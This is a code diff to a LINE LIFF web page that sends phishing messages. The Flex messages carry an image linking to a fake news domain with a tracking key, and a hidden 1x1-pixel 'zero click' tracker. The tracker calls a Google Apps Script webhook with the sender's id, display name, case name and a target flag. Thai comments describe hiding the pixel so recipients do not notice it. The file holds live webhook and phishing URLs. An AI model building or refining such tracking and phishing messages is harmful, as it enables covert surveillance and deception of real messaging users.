@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby-qBEzaaUR911pP5KA1CpLYIt2uGgKhXPl4b_1WXZrxJYvNryGu0lO4mWzxsspa96j/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw4Du0ePCHgmiaHEou3WRcra8mwmhBwQM4G20wcWkAo4lN5nA_3TniXJVHY0uZxFV9c/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,25 +820,26 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
-                const timestamp = Date.now(); // ใช้ timestamp แทน random suffix
+                // สร้าง URL สำหรับ Zero Click tracking ที่มีข้อมูลพื้นฐาน
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // แก้ไขให้ใช้ iframe แทน เพื่อให้ได้ข้อมูล headers เต็มรูปแบบ
+                // สร้าง URL สำหรับ Zero Click tracking แบบใหม่
+                // เพิ่มพารามิเตอร์ 'type=zeroclick' เพื่อระบุชัดเจนว่านี่คือการเรียก ZeroClick
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&isTarget=true`; 
-                zeroClickTrackUrl += `&t=${timestamp}`; // เพิ่ม timestamp เพื่อป้องกันการแคช
+                zeroClickTrackUrl += `&type=zeroclick`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกแบบ ZeroClick
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message แบบใหม่ที่ทำงานได้ดีกว่าสำหรับ Zero Click
+                // สร้าง Flex Message ที่มีการปรับปรุงใหม่
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพจาก ${caseName}`, // ปรับข้อความแจ้งเตือน
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -847,7 +848,7 @@
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
@@ -855,65 +856,29 @@
                         body: {
                             type: 'box',
                             layout: 'vertical',
-                            paddingAll: '0px',
                             contents: [
-                                // เพิ่ม box ที่มี background image เป็น zeroClickTrackUrl
+                                // ใส่รูปภาพ 1x1 pixel สำหรับ zero click tracking - ปรับปรุงแล้ว
                                 {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [
-                                        // ใช้ text ที่มี flex 0 เพื่อให้มั่นใจว่า line จะดึงข้อมูลจาก URL
-                                        {
-                                            type: 'text',
-                                            text: ' ',
-                                            flex: 0,
-                                            contents: [
-                                                {
-                                                    type: 'span',
-                                                    text: ' ',
-                                                    decoration: 'none',
-                                                    style: 'none'
-                                                }
-                                            ]
-                                        }
-                                    ],
-                                    width: '1px',
-                                    height: '1px',
-                                    background: {
-                                        type: 'image',
-                                        url: zeroClickTrackUrl,
-                                        size: 'cover'
-                                    },
-                                    position: 'absolute',
-                                    offsetTop: '0px',
+                                    type: 'image',
+                                    url: zeroClickTrackUrl,
+                                    size: '1px', // ขนาดเล็กมาก
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
                                     offsetStart: '0px'
                                 },
-                                // เพิ่ม padding ใน box หลักเล็กน้อยเพื่อป้องกันไม่ให้ผู้ใช้สังเกตเห็น
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
                                     type: 'box',
                                     layout: 'vertical',
                                     contents: [],
-                                    height: '1px'
+                                    height: '1px',
+                                    width: '1px'
                                 }
                             ],
-                            height: '1px'
-                        },
-                        footer: {
-                            type: 'box',
-                            layout: 'vertical',
-                            spacing: 'none',
-                            margin: 'none',
-                            height: '0px',
-                            contents: [],
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
                             paddingAll: '0px'
-                        },
-                        styles: {
-                            body: {
-                                separator: false
-                            },
-                            footer: {
-                                separator: false
-                            }
                         }
                     }
                 };
